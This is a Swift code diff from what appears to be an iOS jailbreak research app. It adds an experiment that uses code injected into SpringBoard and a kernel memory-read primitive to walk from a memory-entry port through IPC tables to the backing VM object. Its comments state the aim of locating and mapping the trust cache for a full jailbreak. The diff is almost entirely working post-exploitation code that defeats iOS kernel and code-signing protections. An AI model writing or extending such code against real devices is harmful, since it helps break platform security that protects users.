@@ -260,6 +260,14 @@ struct AMFIExperimentView: View {
             let exp69 = self.expPhysicalMemoryDiscovery(rc: rc)
             experimentResults.append(exp69)
             
+            // ============================================
+            // Experiment 70: Extract physical address from port kobject
+            // We have port 98455 → find kobject → get phys addr
+            // Then calculate trust cache physical address
+            // ============================================
+            let exp70 = self.expExtractPhysAddr(rc: rc)
+            experimentResults.append(exp70)
+            
             DispatchQueue.main.async {
                 self.results = experimentResults
                 self.isRunning = false
@@ -2651,6 +2659,191 @@ struct AMFIExperimentView: View {
         
         let success = foundAt != 0
         return ExperimentResult(name: "Phys Memory Discovery", success: success, detail: detail, timestamp: Date())
+    }
+    
+    // MARK: - Experiment 70: Extract Physical Address from Port Kobject
+    
+    /// We have a mach port (from mach_make_memory_entry_64) that represents
+    /// our PurpleGfxMem physical pages. The port's kobject is a vm_named_entry
+    /// which contains the backing VM object → physical page addresses.
+    ///
+    /// Chain: port → IPC entry → ipc_port → kobject (vm_named_entry)
+    ///        → backing_copy (vm_object) → physical pages
+    ///
+    /// If we can read the physical address → we know where our writable memory is
+    /// → calculate offset to trust cache → map it → FULL JAILBREAK
+    private func expExtractPhysAddr(rc: RemoteCall) -> ExperimentResult {
+        guard let sb = dspmgr.shared.sbProc else {
+            return ExperimentResult(name: "Extract Phys Addr", success: false, detail: "No SB RC", timestamp: Date())
+        }
+        
+        let mgr = dspmgr.shared
+        let sbMem = sb.trojanMem
+        var detail = "Extract Physical Address from Port Kobject\n\n"
+        
+        // Step 1: Create PurpleGfxMem + get memory entry port (same as exp 69)
+        detail += "=== Step 1: Get memory entry port ===\n"
+        
+        let RTLD_DEFAULT = UInt64(bitPattern: -2)
+        let nsDictClass = remote_getClass(sb, "NSMutableDictionary")
+        let nsNumClass = remote_getClass(sb, "NSNumber")
+        let numWithInt = remote_sel(sb, "numberWithInteger:")
+        let dictNew = remote_sel(sb, "new")
+        let setObj = remote_sel(sb, "setObject:forKey:")
+        
+        let gfxDict = remote_msg(sb, nsDictClass, dictNew, 0, 0, 0, 0)
+        remote_msg(sb, gfxDict, setObj, remote_msg(sb, nsNumClass, numWithInt, 0x4000, 0, 0, 0), remote_NSString(sb, "IOSurfaceAllocSize"), 0, 0)
+        remote_msg(sb, gfxDict, setObj, remote_NSString(sb, "PurpleGfxMem"), remote_NSString(sb, "IOSurfaceMemoryRegion"), 0, 0)
+        
+        let gfxSurface = RootExecutor.rcall(sb, "IOSurfaceCreate", gfxDict)
+        guard gfxSurface != 0 else {
+            detail += "Cannot create surface\n"
+            return ExperimentResult(name: "Extract Phys Addr", success: false, detail: detail, timestamp: Date())
+        }
+        
+        RootExecutor.rcall(sb, "IOSurfaceLock", gfxSurface, 0, 0)
+        let gfxBase = RootExecutor.rcall(sb, "IOSurfaceGetBaseAddress", gfxSurface)
+        detail += "Surface base: 0x\(String(format: "%llx", gfxBase))\n"
+        
+        // Get memory entry port
+        let sizeAddr = sbMem + 0x3000
+        sb[sizeAddr].setValue64(0x4000)
+        let objectAddr = sbMem + 0x3010
+        sb[objectAddr].setValue32(0)
+        
+        let taskSelf = RootExecutor.rcall(sb, "mach_task_self")
+        let meRet = RootExecutor.rcall(sb, "mach_make_memory_entry_64",
+                                       taskSelf, sizeAddr, gfxBase, 3, objectAddr, 0)
+        let memPort = sb[objectAddr].value32()
+        detail += "Memory entry port: \(memPort), ret=0x\(String(format: "%x", meRet))\n"
+        
+        guard meRet == 0 && memPort != 0 else {
+            detail += "Cannot get memory entry\n"
+            RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
+            return ExperimentResult(name: "Extract Phys Addr", success: false, detail: detail, timestamp: Date())
+        }
+        
+        // Step 2: Find port's kobject in kernel
+        detail += "\n=== Step 2: Find port kobject ===\n"
+        
+        // We need SpringBoard's task to look up the port
+        let sbProc = mgr.findProc(name: "SpringBoard")
+        guard sbProc != 0 else {
+            detail += "Cannot find SpringBoard proc\n"
+            RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
+            return ExperimentResult(name: "Extract Phys Addr", success: false, detail: detail, timestamp: Date())
+        }
+        
+        let sbProcRo = ds_kread64(sbProc + UInt64(off_proc_p_proc_ro))
+        let sbTask = sbProcRo != 0 ? ds_kread64(sbProcRo + UInt64(off_proc_ro_pr_task)) : 0
+        detail += "SB proc: 0x\(String(format: "%llx", sbProc))\n"
+        detail += "SB task: 0x\(String(format: "%llx", sbTask))\n"
+        
+        guard sbTask != 0 else {
+            detail += "Cannot get SB task\n"
+            RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
+            return ExperimentResult(name: "Extract Phys Addr", success: false, detail: detail, timestamp: Date())
+        }
+        
+        // Read IPC space from task
+        // ⚠️ This might panic if task zone is not accessible!
+        // But cyanide-ios does this successfully...
+        detail += "\nReading IPC space (may panic if wrong zone)...\n"
+        let itkSpace = ds_kread64(sbTask + UInt64(off_task_itk_space))
+        detail += "itk_space: 0x\(String(format: "%llx", itkSpace))\n"
+        
+        if itkSpace == 0 {
+            detail += "itk_space is NULL — task zone not accessible\n"
+            RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
+            return ExperimentResult(name: "Extract Phys Addr", success: false, detail: detail, timestamp: Date())
+        }
+        
+        // Read IPC table from space
+        let ipcTable = ds_kread64(itkSpace + UInt64(off_ipc_space_is_table))
+        detail += "IPC table: 0x\(String(format: "%llx", ipcTable))\n"
+        
+        if ipcTable == 0 {
+            detail += "IPC table is NULL\n"
+            RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
+            return ExperimentResult(name: "Extract Phys Addr", success: false, detail: detail, timestamp: Date())
+        }
+        
+        // Look up our port in the table
+        // Port name format: index << 8 | generation
+        // Entry size: sizeof_ipc_entry (0x18)
+        let portIndex = UInt64(memPort >> 8)
+        let entryAddr = ipcTable + (portIndex * UInt64(sizeof_ipc_entry))
+        detail += "Port index: \(portIndex), entry at: 0x\(String(format: "%llx", entryAddr))\n"
+        
+        // Read ie_object (ipc_port pointer)
+        let ipcPort = ds_kread64(entryAddr + UInt64(off_ipc_entry_ie_object))
+        detail += "ipc_port: 0x\(String(format: "%llx", ipcPort))\n"
+        
+        if ipcPort == 0 {
+            detail += "ipc_port is NULL\n"
+            RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
+            return ExperimentResult(name: "Extract Phys Addr", success: false, detail: detail, timestamp: Date())
+        }
+        
+        // Read kobject from port (vm_named_entry)
+        let kobject = ds_kread64(ipcPort + UInt64(off_ipc_port_ip_kobject))
+        detail += "kobject (vm_named_entry): 0x\(String(format: "%llx", kobject))\n"
+        
+        if kobject == 0 {
+            detail += "kobject is NULL\n"
+            RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
+            return ExperimentResult(name: "Extract Phys Addr", success: false, detail: detail, timestamp: Date())
+        }
+        
+        // Step 3: Read vm_named_entry → backing VM object
+        detail += "\n=== Step 3: Read vm_named_entry ===\n"
+        
+        let backingCopy = ds_kread64(kobject + UInt64(off_vm_named_entry_backing_copy))
+        let entrySize = ds_kread64(kobject + UInt64(off_vm_named_entry_size))
+        detail += "backing_copy: 0x\(String(format: "%llx", backingCopy))\n"
+        detail += "entry_size: 0x\(String(format: "%llx", entrySize))\n"
+        
+        if backingCopy != 0 {
+            // Read VM object to find physical pages
+            detail += "\n=== Step 4: Read VM object ===\n"
+            
+            // vm_object has vo_un1.vou_size at offset, and page list
+            let objSize = ds_kread64(backingCopy + UInt64(off_vm_object_vo_un1_vou_size))
+            let refCount = ds_kread32(backingCopy + UInt64(off_vm_object_ref_count))
+            detail += "VM object size: 0x\(String(format: "%llx", objSize))\n"
+            detail += "VM object refcount: \(refCount)\n"
+            
+            // The physical address might be stored in the vm_object's
+            // resident page list or in a pager structure
+            // Read first few fields to understand layout
+            detail += "\nVM object raw dump (first 64 bytes):\n"
+            for i in stride(from: 0, to: 64, by: 8) {
+                let val = ds_kread64(backingCopy + UInt64(i))
+                if val != 0 {
+                    detail += "  +\(i): 0x\(String(format: "%llx", val))\n"
+                }
+            }
+            
+            detail += "\nVM object found! Physical pages are tracked here.\n"
+            detail += "The vm_page structures contain phys_page field.\n"
+            detail += "Next: traverse vm_object's memq to find physical page numbers.\n"
+        }
+        
+        RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
+        
+        // Summary
+        detail += "\n=== SUMMARY ===\n"
+        let gotKobject = kobject != 0 && backingCopy != 0
+        if gotKobject {
+            detail += "Successfully traversed: port → IPC → kobject → VM object!\n"
+            detail += "Physical page info is in the VM object's page list.\n"
+            detail += "Next experiment: read vm_page structs to get physical addresses.\n"
+        } else {
+            detail += "Could not fully traverse port kobject chain.\n"
+        }
+        
+        let success = gotKobject
+        return ExperimentResult(name: "Extract Phys Addr", success: success, detail: detail, timestamp: Date())
     }
     
     #endif
